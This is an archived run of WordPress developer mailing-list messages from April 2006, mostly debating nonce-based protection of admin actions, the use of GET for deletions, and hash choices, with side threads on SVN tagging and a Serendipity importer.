Brian Layman wrote:
>
>The first thing is that Owen encrypts using both the DB password AND the
> current user password.
h
If that's the case then I apologize for wasting everyone's time. In
the nonce.2.diff patch on trac, it's this:

   md5($end . DB_PASS . $action . $uid);

I don't see a user password there.

Also: DB_PASS is actually undefined; I think we want DB_PASSWORD. ;)

(On that note, Robert, the nonce you posted thinks your password is
the string 'DB_PASS'.)


On 4/22/06, Robert Deaton <false.hopes@gmail.com> wrote:
>
> Like I said before, people with access to your blog should be "trusted
> users" as someone said earlier. If you can't trust the users on your
> blog, you have bigger issues at hand.

There's an option for user registration. If untrusted users shouldn't
be registered, that option needs to be removed.

> a rainbow table, that happens to be
> prepended with a five digit integer and augmented with a 1-2 digit
> integer, now this I'd like to see.

Oh man, I don't know what I was thinking. /me smacks self. Maybe
against people with 2-character DB passwords... ;)


> This would be self-admission of trolling, imho.
>

No, this would be an admission that I'm not a kook who's going to fly
off the handle and start scare-mongering all over the place if it
isn't changed.


> Any extra salt is going to
> come with the same exact criticism as having DB_PASS as salt.

Well yeah, but it'd take exponentially longer to break.

> This is also something that has to be propogated on every WP admin
> action, and so anything that adversely affects performance is a -1, we
> get enough complaints of how bad WP damages servers and buckles under
> load as it is. We're playing in a world where 17ms makes a human
> perceptible difference in the loading time.

In the benchmark I just ran, one md5() took ~0.007ms. YMMV, but to me
it doesn't look like a problem.
From Brian at TheCodeCave.com  Sat Apr 22 04:18:59 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Sat Apr 22 04:23:18 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <aa74b1910604212102h78ed0693p43db91547a70bacf@mail.gmail.com>
Message-ID: <002b01c665c3$e1ef1cd0$0664a8c0@tiger1>


Sam:
>If that's the case then I apologize for wasting everyone's time. In the
nonce.2.diff patch on trac, it's this:
>md5($end . DB_PASS . $action . $uid);
>I don't see a user password there.

You, sir, are correct.  I saw what I wanted to see. That's not the
hashed UserPW, but the user ID.  The hashed PW would be more secure of
course, but the DB_Password will still be a difficult item to guess at.


Is there anyone here that was assigned a simple single word MySQL DB
password by their shared server host?

From sam at rephrase.net  Sat Apr 22 04:52:01 2006
From: sam at rephrase.net (Sam Angove)
Date: Sat Apr 22 04:56:07 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <002b01c665c3$e1ef1cd0$0664a8c0@tiger1>
References: <aa74b1910604212102h78ed0693p43db91547a70bacf@mail.gmail.com>
	<002b01c665c3$e1ef1cd0$0664a8c0@tiger1>
Message-ID: <aa74b1910604212152s6e040fafr717a326d314ee8cc@mail.gmail.com>

On 4/22/06, Brian Layman <Brian@thecodecave.com> wrote:
>
> Is there anyone here that was assigned a simple single word MySQL DB
> password by their shared server host?

At Dreamhost you pick your own passwords.
From mark.wordpress at txfx.net  Sat Apr 22 07:37:27 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Sat Apr 22 07:41:38 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<44495964.6080604@metalab.unc.edu>
	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>
Message-ID: <D6ADD8FD-F396-466C-9984-8F40A4A5AF90@txfx.net>

On Apr 21, 2006, at 7:30 PM, Robert Deaton wrote:

> As far as I'm concerned, until there is a solution that makes sense
> for this problem, I'm fine with abusing the HTTP standard.

As long as you can live with the consequences (or better, know enough  
to code around them), I think they're a necessary evil (if violating  
the HTTP standard is "evil").
--
Mark Jaquith
http://txfx.net/


From peter.westwood at ftwr.co.uk  Sat Apr 22 08:04:33 2006
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Sat Apr 22 08:08:43 2006
Subject: [wp-hackers] 2.0.2 subversion tag
In-Reply-To: <4415AF7E.2070000@boren.nu>
References: <75835fe10603130631v593769e5qd7dd6638f353c319@mail.gmail.com>	<jo3b12l1188fqon0secubkqg1f893p25d0@4ax.com>
	<4415AF7E.2070000@boren.nu>
Message-ID: <4449E391.1050004@ftwr.co.uk>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

/me awakens an old thread

Ryan Boren wrote:
> Stefano wrote:
>> Il Mon, 13 Mar 2006 09:31:26 -0500, "Justin Moore"
>> <wantmoore@gmail.com> scrive:
>>
>>
>>> I'm either blind or stupid (likely the latter), but I don't seem to
>>> see a tags/2.0.2 in SVN. From looking at Trac, it appears that
>>> upgrading to branches/2.0 will get the 2.0.2 release for now - is that
>>> correct?
>>
>>
>> Yes the 2.0.2 was developped under braches 2.0, i suppose that in the
>> next days Ryn will tag a 2.0.2 as usual. Practically trunk is used for
>> future version, braches for a "dormient" version ready for urgently
>> update lieke security flwn etc. and tags for realeased version
> 
> I've been trying to tag, but the server problems are preventing me.
> Hopefully that will be fixed soon.

Is this still a problem - now you've started on 2.0.3 developement on
the 2.0 branch it would be good to get 2.0.2 tagged so we don't lose
track of it.

westi
- --
Peter Westwood
http://blog.ftwr.co.uk
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.2 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFESeORVPRdzag0AcURAgBiAKC5XJyhWQut/STZuOa7BvQNT8/pMQCgitvb
Y6rtOJ52mjyvTZpniQrzzb8=
=SWYz
-----END PGP SIGNATURE-----

From mike at zed1.com  Sat Apr 22 10:15:05 2006
From: mike at zed1.com (Mike Little)
Date: Sat Apr 22 10:19:13 2006
Subject: [wp-hackers] Re: [wp-svn] [3749] trunk/wp-admin: Remove those
	naughty flushes.
In-Reply-To: <200604220210.k3M2AjF5045693@comox.textdrive.com>
References: <200604220210.k3M2AjF5045693@comox.textdrive.com>
Message-ID: <7235ce780604220315odf55ea7w7454f760e2e3e2fb@mail.gmail.com>

On 4/22/06, m@wordpress.org <m@wordpress.org> wrote:
>
>  Revision 3749 Author ryan Date 2006-04-22 02:10:42 +0000 (Sat, 22 Apr 2006)
> Log Message Remove those naughty flushes.
>

Why?
Don't they prevent timeouts (and give valuable feedback) on really
large imports?

Mike
--
Mike Little
http://zed1.com/
From elharo at metalab.unc.edu  Sat Apr 22 11:44:19 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Sat Apr 22 11:48:52 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<44495964.6080604@metalab.unc.edu>
	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>
Message-ID: <444A1713.6060605@metalab.unc.edu>

Robert Deaton wrote:

> Think about every area in the admin panel where it makes sense to use
> a normal link instead of a form button to do things. Let's take the
> manage posts page, where the Delete action is one that uses GET to
> carry out an action. Now, let's think about a cross browser way to
> make this link POST its data instead, without javascript, because we
> have to be kind to those who disable javascript. Oh, yeah, we can make
> a form with a submit button, but that doesn't match all the other
> links to do things on the page, and it'd look completely wrong if we
> changed everything to submit buttons. Oh wait, we can style that with
> CSS? You're leaving a few browsers out. So now what do we have? An
> ugly interface, which will surely raise more eyebrows, to fix a
> problem that has a different solution.

There's a very good reason to make the DELETE action look different. It 
is not side-effect free, unlike a lot of the other actions. The user 
should see a visual distinction that clues them in that something is 
different about this action they're abut to take. Having delete look 
different is a feature, not a bug.

> As far as I'm concerned, until there is a solution that makes sense
> for this problem, I'm fine with abusing the HTTP standard.

It sounds like you're happy living in a house that will fall down when 
someone leans on the wrong corner as long as you get to paint the 
molding in just the right shade of puce. Frankly I find that attitude 
incomprehensible, though lord knows I've seen enough of it over the last 
ten years, even before JavaScript and CSS were invented. Perhaps it's 
just how we're wired. Some people focus on the external appearance and 
some focus on the internal architecture, and neither will ever 
understand or comprehend the other.

The best you can hope for is a decoupling of the internal architecture 
from the external appearance so that one can be changed without 
affecting or limiting the other. To a large extent that's what CSS and 
XForms attempt to provide on the Web. Unfortunately we're not all the 
way there yet.

For me at least, until we are, I'm much more concerned about getting the 
architecture right to provide the security, scalability, and robustness 
I want out of a web app. I can live with a site where the delete link 
looks a tad funky. I can't live with a site where any contributor or 
commenter can delete a post they don't like.

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From elharo at metalab.unc.edu  Sat Apr 22 11:46:34 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Sat Apr 22 11:51:04 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <44495AD6.7040905@atl.lmco.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<44490419.80507@midnightcircus.com>	<4449102E.20007@paul-mitchell.me.uk>	<444913C1.7060507@midnightcircus.com>	<44494901.2020008@paul-mitchell.me.uk>	<44494CC4.7040606@midnightcircus.com>	<44494E60.3080403@paul-mitchell.me.uk>	<a491f91d0604211435y2705cca8p5c1f3217294aa42d@mail.gmail.com>	<4449529E.2040002@paul-mitchell.me.uk>	<444953FD.5060302@atl.lmco.com>	<a491f91d0604211511o136f4822i5c2dd203f0392d6d@mail.gmail.com>	<444959FA.5010600@metalab.unc.edu>
	<44495AD6.7040905@atl.lmco.com>
Message-ID: <444A179A.4020601@metalab.unc.edu>

Doug Stewart wrote:
> -----BEGIN PGP SIGNED MESSAGE-----
> Hash: SHA1
> 
> Elliotte Harold wrote:
>> SHA-1 has recently begun to show weaknesses. For now they're probably
>> not relevant for this use case, but attacks only get better with time.
>> They never get worse. SHA-256, SHA-512, or Whirlpool might be better
>> choices.
>>
> 
> Agreed, but last I checked, none of those had native PHP implementations.
> 

PHP is Turing complete. None of these would be all that hard to 
implement. Designing new, secure hash algorithms is tough. Porting them 
to a different language is a simple matter of coding and testing.

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From elharo at metalab.unc.edu  Sat Apr 22 11:58:03 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Sat Apr 22 12:02:35 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <a491f91d0604212005i50b714c8n3287a8554972f61c@mail.gmail.com>
References: <4449529E.2040002@paul-mitchell.me.uk>	<000601c66596$541d3d60$2f01a8c0@kergan>	<a491f91d0604211612tc3076c6p36579748173d24d3@mail.gmail.com>	<44496EAB.8030704@paul-mitchell.me.uk>	<44497BD1.2060703@midnightcircus.com>	<aa74b1910604211833q7b2d7f03vd9971de37fca6ad5@mail.gmail.com>	<a491f91d0604211901k7cbe47d4q2d6963d8271c0868@mail.gmail.com>	<aa74b1910604211938t772c280bp9bb7c415a9cb4bc9@mail.gmail.com>
	<a491f91d0604212005i50b714c8n3287a8554972f61c@mail.gmail.com>
Message-ID: <444A1A4B.9050900@metalab.unc.edu>

Robert Deaton wrote:

> Like I said before, people with access to your blog should be "trusted
> users" as someone said earlier. If you can't trust the users on your
> blog, you have bigger issues at hand.
> 

Insider attacks still account for a large portion of successful and 
sometimes undetected cracks. Privileges are important. Authors I trust 
to write their own articles and submit drafts should not be trusted to 
publish drafts. Editors I trust to edit and approve articles shouldn't 
be trusted to edit the blog's theme.

Security professionals gave up on the idea of trusting everyone on a 
system so many decades ago I don't even remember when. Different users 
have different levels of trust. The system should not enable a user to 
escalate their privileges unilaterally.

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From wp-hackers at paul-mitchell.me.uk  Sat Apr 22 14:21:28 2006
From: wp-hackers at paul-mitchell.me.uk (Paul Mitchell)
Date: Sat Apr 22 14:26:30 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <44497BD1.2060703@midnightcircus.com>
References: <4449529E.2040002@paul-mitchell.me.uk>	<000601c66596$541d3d60$2f01a8c0@kergan>	<a491f91d0604211612tc3076c6p36579748173d24d3@mail.gmail.com>	<44496EAB.8030704@paul-mitchell.me.uk>
	<44497BD1.2060703@midnightcircus.com>
Message-ID: <444A3BE8.4040906@paul-mitchell.me.uk>

Owen,

I don't like to repeat myself, so I'm glad someone else spotted it too. 
http://trac.wordpress.org/ticket/2678#change_10

Paul

From false.hopes at gmail.com  Sat Apr 22 14:24:52 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Sat Apr 22 14:28:57 2006
Subject: [wp-hackers] 2.0.2 subversion tag
In-Reply-To: <4449E391.1050004@ftwr.co.uk>
References: <75835fe10603130631v593769e5qd7dd6638f353c319@mail.gmail.com>
	<jo3b12l1188fqon0secubkqg1f893p25d0@4ax.com>
	<4415AF7E.2070000@boren.nu> <4449E391.1050004@ftwr.co.uk>
Message-ID: <a491f91d0604220724i5faaf2bbqe705bee197bd6da3@mail.gmail.com>

On 4/22/06, Peter Westwood <peter.westwood@ftwr.co.uk> wrote:
> -----BEGIN PGP SIGNED MESSAGE-----
> Hash: SHA1
>
> /me awakens an old thread
> > I've been trying to tag, but the server problems are preventing me.
> > Hopefully that will be fixed soon.
>
> Is this still a problem - now you've started on 2.0.3 developement on
> the 2.0 branch it would be good to get 2.0.2 tagged so we don't lose
> track of it.

Yes, its still a problem, we discussed this on IRC earlier. 2.0.2 is
r3637, as soon as he can tag it, he said he would.

--
--Robert Deaton
http://somethingunpredictable.com
From false.hopes at gmail.com  Sat Apr 22 14:42:20 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Sat Apr 22 14:46:28 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444A1713.6060605@metalab.unc.edu>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<44495964.6080604@metalab.unc.edu>
	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>
	<444A1713.6060605@metalab.unc.edu>
Message-ID: <a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>

\On 4/22/06, Elliotte Harold <elharo@metalab.unc.edu> wrote:
> Robert Deaton wrote:
> There's a very good reason to make the DELETE action look different. It
> is not side-effect free, unlike a lot of the other actions. The user
> should see a visual distinction that clues them in that something is
> different about this action they're abut to take. Having delete look
> different is a feature, not a bug.

The delete action does look different, in its text, that's how I
distinguish it, and that's how every other user distinguishes it.
Ruining a beautiful UI is a bug, not a feature. To a user, does a
submit form button alert you of something? To me, it makes me wonder
which form I'm submitting in the absence of any input fields. For my
grandma, which do you think will make her come ask me a question? Why
we're disregarding a paragraph of the HTTP standard, or why some of
these buttons look like form submits?

> > As far as I'm concerned, until there is a solution that makes sense
> > for this problem, I'm fine with abusing the HTTP standard.
>
> It sounds like you're happy living in a house that will fall down when
> someone leans on the wrong corner as long as you get to paint the
> molding in just the right shade of puce. Frankly I find that attitude
> incomprehensible, though lord knows I've seen enough of it over the last
> ten years, even before JavaScript and CSS were invented. Perhaps it's
> just how we're wired. Some people focus on the external appearance and
> some focus on the internal architecture, and neither will ever
> understand or comprehend the other.

I think you need to come down off the high and mighty horse here for a
second and look around you. I am not a UI artist, its probably one of
the worst things I do, I write code. I find it hard to believe someone
finds an attitude of ignoring a little part of a standard
"incomprehensible," because if everyone lived by every little
standard, where would we be today? I'm happy living in a house that I
have personally helped code the refortifications for, knowing that the
house is not going to fall down just because we're making changes on a
GET request, when there is no other way to do it properly and maintain
our interface.

> The best you can hope for is a decoupling of the internal architecture
> from the external appearance so that one can be changed without
> affecting or limiting the other. To a large extent that's what CSS and
> XForms attempt to provide on the Web. Unfortunately we're not all the
> way there yet.

And like every standard we wish was adopted in its entirety for the
web, its going to be another 3-6 years before everything is ready and
works.

>
> For me at least, until we are, I'm much more concerned about getting the
> architecture right to provide the security, scalability, and robustness
> I want out of a web app. I can live with a site where the delete link
> looks a tad funky. I can't live with a site where any contributor or
> commenter can delete a post they don't like.

And with the code that Owen, mdawaffe, and I put together in the nice
nonces patch you see on trac, they won't be able to. Just because the
action is GET, doesn't mean it can't be secured, and this is part of
my reasoning for helping. You might be able to look with a god ugly
admin panel, but the hundreds of thousands of users who moved to WP
from some other blogging software would quickly move right back the
moment the admin interface looks like someone smeered a forms all over
where they don't belong. Normally, I'd agree with you, I'm an
architecture designer, I hate UI, but this is common sense.

If you're concerned about the security, I suggest you have a take at
the nonces patch on trac (and the forthcoming patches to change a few
things around). If you're concerned about the scalability, we've
already thought about that, thus the idea of computational nonces.

--
--Robert Deaton
http://somethingunpredictable.com
From lists at alexking.org  Sat Apr 22 16:01:50 2006
From: lists at alexking.org (Alex King)
Date: Sat Apr 22 16:05:59 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <D6ADD8FD-F396-466C-9984-8F40A4A5AF90@txfx.net>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<44495964.6080604@metalab.unc.edu>
	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>
	<D6ADD8FD-F396-466C-9984-8F40A4A5AF90@txfx.net>
Message-ID: <CF320523-14ED-44F6-AB3C-CAAA6D257455@alexking.org>

It's not even a violation, it's merely choosing not to follow a  
recommendation. SHOULD != MUST.

Cheers,
--Alex King

Personal             Business               FeedLounge
http://alexking.org  http://kingdesign.net  http://feedlounge.com


On Apr 22, 2006, at 1:37 AM, Mark Jaquith wrote:

> On Apr 21, 2006, at 7:30 PM, Robert Deaton wrote:
>
>> As far as I'm concerned, until there is a solution that makes sense
>> for this problem, I'm fine with abusing the HTTP standard.
>
> As long as you can live with the consequences (or better, know  
> enough to code around them), I think they're a necessary evil (if  
> violating the HTTP standard is "evil").

From false.hopes at gmail.com  Sat Apr 22 16:36:58 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Sat Apr 22 16:41:04 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <CF320523-14ED-44F6-AB3C-CAAA6D257455@alexking.org>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<44495964.6080604@metalab.unc.edu>
	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>
	<D6ADD8FD-F396-466C-9984-8F40A4A5AF90@txfx.net>
	<CF320523-14ED-44F6-AB3C-CAAA6D257455@alexking.org>
Message-ID: <a491f91d0604220936x101a2cffn124cd4328773ec18@mail.gmail.com>

On 4/22/06, Alex King <lists@alexking.org> wrote:
> It's not even a violation, it's merely choosing not to follow a
> recommendation. SHOULD != MUST.

Even better, now I really see no reason to change the current
behavior, if it is properly protected as code is being written to do.

--
--Robert Deaton
http://somethingunpredictable.com
From denis at semiologic.com  Sat Apr 22 17:08:46 2006
From: denis at semiologic.com (Denis de Bernardy)
Date: Sat Apr 22 17:12:59 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <444A179A.4020601@metalab.unc.edu>
Message-ID: <000001c6662f$6c922150$2f01a8c0@kergan>


> PHP is Turing complete. None of these would be all that hard to 
> implement. Designing new, secure hash algorithms is tough. 
> Porting them 
> to a different language is a simple matter of coding and testing.

Mm... Let's see your implementation of the secure hash algorithms in Brainfuck or XSLT. Both are Turing complete as well, and it really wouldn't be all that hard to implement. A simple matter of coding and testing.

Denis



> ?Elliotte Rusty Harold  elharo@metalab.unc.edu
> XML in a Nutshell 3rd Edition Just Published! 
> http://www.cafeconleche.org/books/xian3/
> http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/
ref=nosim
_______________________________________________
wp-hackers mailing list
wp-hackers@lists.automattic.com http://lists.automattic.com/mailman/listinfo/wp-hackers

From filip at filipdewaard.com  Sat Apr 22 17:13:06 2006
From: filip at filipdewaard.com (Filip de Waard)
Date: Sat Apr 22 17:17:18 2006
Subject: [wp-hackers] Importing Serendipity content into Wordpress
In-Reply-To: <8A8AFB24-4AD0-4F9D-A06A-7F578B3A5C82@filipdewaard.com>
References: <8A8AFB24-4AD0-4F9D-A06A-7F578B3A5C82@filipdewaard.com>
Message-ID: <9B1DDBBC-BC1A-4D7A-857A-E9346F006ED0@filipdewaard.com>

Hello,

Who is in charge of the import scripts in the Wordpress team? I  
realize my message arrived in the middle of a political discussion  
about security, but I'd really like to get in touch with someone who  
handles the import scripts, because it would be nice to have an  
import script for Serendipity included in Wordpress and I'd be happy  
to help writing it.

Cheers,

Filip de Waard
http://www.filipdewaard.com

On 21-apr-2006, at 6:28, Filip de Waard wrote:

> Hello,
>
> As I'm a new user to Wordpress, this is my first post to this list.  
> I've just migrated my weblog from Serendipity to Wordpress. Because  
> I couldn't find any other way to get my old content into Wordpress,  
> I've written an import script that imports the posts and comments  
> and preserves the old Serendipity URI's in Wordpress.
>
> The script is a hack - in the bad sense of the word. I needed  
> something quick 'n dirty and thats what it turned out to be. I've  
> posted the script at http://www.filipdewaard.com/personal/long-time- 
> no-see/ (its GNU GPL). Maybe this will help somebody else who is  
> planning to migrate. Additionally, it would be nice to add  
> something like this to Wordpress. If someone wants to use my script  
> as a starting point to write a more mature version or wants to port  
> it to the Wordpress API, I would be happy to cooperate.
>
> Just drop me a message if you have any questions or comments about  
> the script.
>
> With kind regards,
>
> Filip de Waard
> ---
> http://www.filipdewaard.com
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From denis at semiologic.com  Sat Apr 22 17:20:10 2006
From: denis at semiologic.com (Denis de Bernardy)
Date: Sat Apr 22 17:24:20 2006
Subject: [wp-hackers] Importing Serendipity content into Wordpress
In-Reply-To: <9B1DDBBC-BC1A-4D7A-857A-E9346F006ED0@filipdewaard.com>
Message-ID: <000101c66631$0368fa80$2f01a8c0@kergan>

for the most part, trac.wordpress.org is in charge.

see also:

http://codex.wordpress.org/User:Matt/WordPress_Responsibilities

D.


> -----Original Message-----
> From: wp-hackers-bounces@lists.automattic.com 
> [mailto:wp-hackers-bounces@lists.automattic.com] On Behalf Of 
> Filip de Waard
> Sent: Saturday, April 22, 2006 10:13 AM
> To: wp-hackers@lists.automattic.com
> Subject: Re: [wp-hackers] Importing Serendipity content into Wordpress
> 
> 
> Hello,
> 
> Who is in charge of the import scripts in the Wordpress team? I  
> realize my message arrived in the middle of a political discussion  
> about security, but I'd really like to get in touch with someone who  
> handles the import scripts, because it would be nice to have an  
> import script for Serendipity included in Wordpress and I'd be happy  
> to help writing it.
> 
> Cheers,
> 
> Filip de Waard
> http://www.filipdewaard.com
> 
> On 21-apr-2006, at 6:28, Filip de Waard wrote:
> 
> > Hello,
> >
> > As I'm a new user to Wordpress, this is my first post to this list.
> > I've just migrated my weblog from Serendipity to Wordpress. 
> Because  
> > I couldn't find any other way to get my old content into 
> Wordpress,  
> > I've written an import script that imports the posts and comments  
> > and preserves the old Serendipity URI's in Wordpress.
> >
> > The script is a hack - in the bad sense of the word. I needed
> > something quick 'n dirty and thats what it turned out to be. I've  
> > posted the script at 
> http://www.filipdewaard.com/personal/long-time- 
> > no-see/ (its GNU GPL). Maybe this will help somebody else who is  
> > planning to migrate. Additionally, it would be nice to add  
> > something like this to Wordpress. If someone wants to use 
> my script  
> > as a starting point to write a more mature version or wants 
> to port  
> > it to the Wordpress API, I would be happy to cooperate.
> >
> > Just drop me a message if you have any questions or comments about
> > the script.
> >
> > With kind regards,
> >
> > Filip de Waard
> > ---
> > http://www.filipdewaard.com
> >
> >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers@lists.automattic.com 
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com 
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 

From false.hopes at gmail.com  Sat Apr 22 17:23:11 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Sat Apr 22 17:27:29 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <444A179A.4020601@metalab.unc.edu>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<44494CC4.7040606@midnightcircus.com>
	<44494E60.3080403@paul-mitchell.me.uk>
	<a491f91d0604211435y2705cca8p5c1f3217294aa42d@mail.gmail.com>
	<4449529E.2040002@paul-mitchell.me.uk> <444953FD.5060302@atl.lmco.com>
	<a491f91d0604211511o136f4822i5c2dd203f0392d6d@mail.gmail.com>
	<444959FA.5010600@metalab.unc.edu> <44495AD6.7040905@atl.lmco.com>
	<444A179A.4020601@metalab.unc.edu>
Message-ID: <a491f91d0604221023m6ab7942cl318dbbd8145f4fb0@mail.gmail.com>

On 4/22/06, Elliotte Harold <elharo@metalab.unc.edu> wrote:
> PHP is Turing complete. None of these would be all that hard to
> implement. Designing new, secure hash algorithms is tough. Porting them
> to a different language is a simple matter of coding and testing.

PHP is also an interpreted, loosely typed language. The difference
speed of a PHP version of an algorithm and the proper lower level C
implementation of the algorithm would be substantial, and like has
already been said, we're working in an area where speed is of the
utmost importance, delaying for an additional half a second while a
PHP sha256 or sha512 algorithm is run over a short hash is not
acceptable, especially when such algorithms depend on a PHP BigInt
implementation.

You know, I'm really starting to feel like a parrot repeating myself,
didn't I already explain that PHP versions of algorithms would be
unacceptable when someone suggested sha1?

--
--Robert Deaton
http://somethingunpredictable.com
From wp-hackers at paul-mitchell.me.uk  Sat Apr 22 18:18:00 2006
From: wp-hackers at paul-mitchell.me.uk (Paul Mitchell)
Date: Sat Apr 22 18:22:58 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <000001c6662f$6c922150$2f01a8c0@kergan>
References: <000001c6662f$6c922150$2f01a8c0@kergan>
Message-ID: <444A7358.8010601@paul-mitchell.me.uk>

Denis de Bernardy wrote:
> Mm... Let's see your implementation of the secure hash algorithms in Brainfuck or XSLT. 
NO! NO! PLEASE! THINK OF THE CHILDREN!!!

Paul

:)

From elharo at metalab.unc.edu  Sat Apr 22 19:04:23 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Sat Apr 22 19:09:05 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<44495964.6080604@metalab.unc.edu>	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>	<444A1713.6060605@metalab.unc.edu>
	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>
Message-ID: <444A7E37.6000906@metalab.unc.edu>

Robert Deaton wrote:

> I think you need to come down off the high and mighty horse here for a
> second and look around you. I am not a UI artist, its probably one of
> the worst things I do, I write code. I find it hard to believe someone
> finds an attitude of ignoring a little part of a standard
> "incomprehensible," because if everyone lived by every little
> standard, where would we be today? 

This is a not a little part of the HTTP standard. It is a major part of 
the foundation. Throwing away the side-effect free nature of GET is like 
  throwing away natural selection in biology. It's that critical.

> I'm happy living in a house that I
> have personally helped code the refortifications for, knowing that the
> house is not going to fall down just because we're making changes on a
> GET request, when there is no other way to do it properly and maintain
> our interface.

I am not at all convinced that the proposed fix will work. I think there 
are more problems waiting to be found, and you're going to find them 
sooner rather than later. Even if you get lucky and paper over the 
problems with band-aids as they arise, you'll eventually be left with a 
confusing mess of unmaintainable kludges that no one really understands. 
There's no other possible result when you deliberately work against the 
nature of your underlying protocol (HTTP).

> And with the code that Owen, mdawaffe, and I put together in the nice
> nonces patch you see on trac, they won't be able to. Just because the
> action is GET, doesn't mean it can't be secured, and this is part of
> my reasoning for helping. 

It's not simply a question of security. There are other bugs and 
problems waiting to bite. Caches, load balancers, web accelerators, and 
more all depend on the side-effect free nature of GET. Even if you get 
security right (and I'm not sure you have) there's a lot more to worry 
about.

> You might be able to look with a god ugly
> admin panel, but the hundreds of thousands of users who moved to WP
> from some other blogging software would quickly move right back the
> moment the admin interface looks like someone smeered a forms all over
> where they don't belong. Normally, I'd agree with you, I'm an
> architecture designer, I hate UI, but this is common sense.

It's a lot easier to repaint a house than to rebuild its framework. I'm 
not in the least bit convinced that a proper system that used POST for 
non-idempotent side effect causing operations has to look bad. In fact, 
I believe it can look perfectly dine. It might look different, but there 
are many existence proofs that such sites are readable and usable. Web 
surfers are not in the least bit confused by the metaphor of pressing a 
button to take an action.

Oh, one more thing: there is one major development barreling down the 
road getting ready to smack WordPress's current architecture upside the 
head. Within a year, APP is going to be a sine qua non for blog 
publishing; and that's totally dependent on a proper implementation of 
GET, POST, PUT, and DELETE. The more right WordPress gets with HTTP now 
the easier it's going to be to support APP in the near future. Of course 
WordPress doesn't have to support APP. It doesn't even support Atom 1.0 
yet. But if that's the road it takes, users are going to jump ship no 
matter how pretty the UI looks. They won't even see the UI most of the 
time, because they'll be editing in a rich client application that 
requires APP on the server.

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From elharo at metalab.unc.edu  Sat Apr 22 19:07:39 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Sat Apr 22 19:12:18 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <000001c6662f$6c922150$2f01a8c0@kergan>
References: <000001c6662f$6c922150$2f01a8c0@kergan>
